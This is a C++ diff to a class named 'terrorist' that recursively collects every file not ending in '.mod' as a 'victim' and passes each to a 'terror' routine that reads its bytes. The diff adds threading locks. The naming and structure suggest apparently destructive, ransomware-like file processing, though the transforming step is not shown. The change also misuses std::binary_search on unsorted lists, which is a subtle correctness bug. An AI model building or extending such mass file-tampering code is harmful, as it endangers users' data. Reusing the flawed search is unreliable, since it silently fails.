@@ -15,11 +15,13 @@ void terrorist::dir_work(std::string root_dir) {
         if (std::filesystem::is_directory(i)) {
             dir_work(i);
         } else {
-            if (!i.ends_with(".mod"))
-                if (std::find(victims.begin(), victims.end(), i) == victims.end() &&
-                    std::find(current_terrorism.begin(), current_terrorism.end(), i) == current_terrorism.end()) {
+            if (!i.ends_with(".mod")) {
+                std::lock_guard<std::mutex> lg(lock);
+                if (!std::binary_search(victims.begin(), victims.end(), i) &&
+                    !std::binary_search(current_terrorism.begin(), current_terrorism.end(), i)) {
                     victims.push_back(i);
                 }
+            }
         }
     }
 }
@@ -88,24 +90,25 @@ auto terrorist::get_iterator(const std::list<std::string> &list, const std::stri
 void terrorist::load_list(){
     while(!victims.empty() || !signal) {
         std::string copy;
-        if (!victims.empty()) {
+        {
+            std::lock_guard<std::mutex> lg(lock);
+            if (!victims.empty()) {
+                    copy = victims.front();
+                    current_terrorism.push_back(copy);
+                    victims.pop_front();
+            }
+        }
+        if(std::filesystem::exists(std::filesystem::path(copy)) && std::filesystem::is_regular_file(std::filesystem::path(copy))) {
+            terror(copy);
             {
                 std::lock_guard<std::mutex> lg(lock);
-                copy = victims.front();
-                current_terrorism.push_back(copy);
-                victims.pop_front();
-            }
-                terror(copy);
                 current_terrorism.erase(get_iterator(current_terrorism, copy));
-
+            }
         }
     }
 }
 
 void terrorist::terror(std::string &victim_path) {
-    if(!std::filesystem::exists(victim_path)){
-        return;
-    }
     std::ifstream file_start(victim_path, std::ios::binary);
      std::uintmax_t size =  std::filesystem::file_size(victim_path);
      std::vector<uint8_t> data(size);
